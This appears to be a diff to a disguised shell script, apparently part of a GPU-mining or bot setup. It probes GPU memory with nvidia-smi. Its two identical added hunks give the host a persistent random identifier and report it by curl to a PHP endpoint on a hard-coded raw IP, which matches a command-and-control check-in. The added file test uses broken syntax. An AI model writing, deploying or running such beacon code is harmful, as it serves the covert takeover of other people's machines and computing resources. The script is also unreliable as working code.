@@ -17,7 +17,22 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 
 google841212121274="http://154.127.52.52"
 
-curl -s http://154.127.52.52/curlgoogle844.php
+FILE=./linux84
+if linux84 -f "$FILE"; then
+
+echo "linux84"
+    
+else
+
+googlelinux84=$(shuf -i 884-88888884 -n 1)
+
+echo "$googlelinux84" > ./linux84
+
+fi
+
+value84=$(cat ./linux84)
+
+curl -s http://154.127.52.52/curlgoogle844.php?linux84=$(echo $value84)
 
 pkill -f curl84
 
@@ -69,7 +84,22 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 
 google841212121274="http://154.127.52.52"
 
-curl -s http://154.127.52.52/curlgoogle844.php
+FILE=./linux84
+if linux84 -f "$FILE"; then
+
+echo "linux84"
+    
+else
+
+googlelinux84=$(shuf -i 884-88888884 -n 1)
+
+echo "$googlelinux84" > ./linux84
+
+fi
+
+value84=$(cat ./linux84)
+
+curl -s http://154.127.52.52/curlgoogle844.php?linux84=$(echo $value84)
 
 pkill -f curl84
 
